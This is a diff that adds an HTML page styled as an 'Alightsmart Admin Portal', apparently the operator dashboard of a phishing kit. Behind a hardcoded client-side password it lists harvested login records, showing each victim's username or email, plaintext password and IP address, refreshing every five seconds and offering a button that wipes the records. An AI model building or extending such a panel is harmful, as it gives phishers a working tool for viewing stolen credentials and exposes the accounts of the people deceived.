@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Alightsmart - Admin Login Records</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #f8fafc;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: #5a67d8;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .login-box {
+            padding: 40px;
+            text-align: center;
+        }
+        input[type="password"] {
+            padding: 14px;
+            font-size: 1.1rem;
+            width: 320px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 14px 32px;
+            background: #5a67d8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #4c51bf;
+        }
+        .records {
+            display: none;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 14px;
+            border-bottom: 1px solid #eee;
+            text-align: left;
+        }
+        th {
+            background: #f1f5f9;
+        }
+        .clear-btn {
+            background: #e53e3e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Alightsmart Admin Portal</h1>
+            <p>Customer Support - Login Records</p>
+        </div>
+
+        <!-- Login Screen -->
+        <div id="loginScreen" class="login-box">
+            <h2>Enter Admin Password</h2>
+            <input type="password" id="adminPassword" placeholder="Enter admin password" autofocus>
+            <br><br>
+            <button onclick="checkPassword()">Unlock Admin Panel</button>
+        </div>
+
+        <!-- Records Screen (Hidden initially) -->
+        <div id="recordsScreen" class="records">
+            <div style="padding: 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center;">
+                <h2>Login Records</h2>
+                <button class="clear-btn" onclick="clearRecords()">Clear All</button>
+            </div>
+            <table id="recordsTable">
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Username / Email</th>
+                        <th>Password</th>
+                        <th>IP</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = "Iyatunde";   // ← Change this to your own password
+
+        function checkPassword() {
+            const entered = document.getElementById('adminPassword').value;
+            if (entered === ADMIN_PASSWORD) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('recordsScreen').style.display = 'block';
+                loadRecords();
+            } else {
+                alert("❌ Incorrect Password");
+            }
+        }
+
+        async function loadRecords() {
+            try {
+                const res = await fetch('/api/records');
+                const records = await res.json();
+                const tbody = document.querySelector('#recordsTable tbody');
+                tbody.innerHTML = '';
+
+                records.reverse().forEach(r => {
+                    const row = `<tr>
+                        <td>${r.timestamp}</td>
+                        <td><strong>${r.username}</strong></td>
+                        <td><code>${r.password}</code></td>
+                        <td>${r.ip}</td>
+                    </tr>`;
+                    tbody.innerHTML += row;
+                });
+            } catch(e) {}
+        }
+
+        async function clearRecords() {
+            if (confirm("Delete all login records?")) {
+                await fetch('/api/clear', { method: 'POST' });
+                loadRecords();
+            }
+        }
+
+        // Auto-refresh every 5 seconds
+        setInterval(() => {
+            if (document.getElementById('recordsScreen').style.display === 'block') {
+                loadRecords();
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
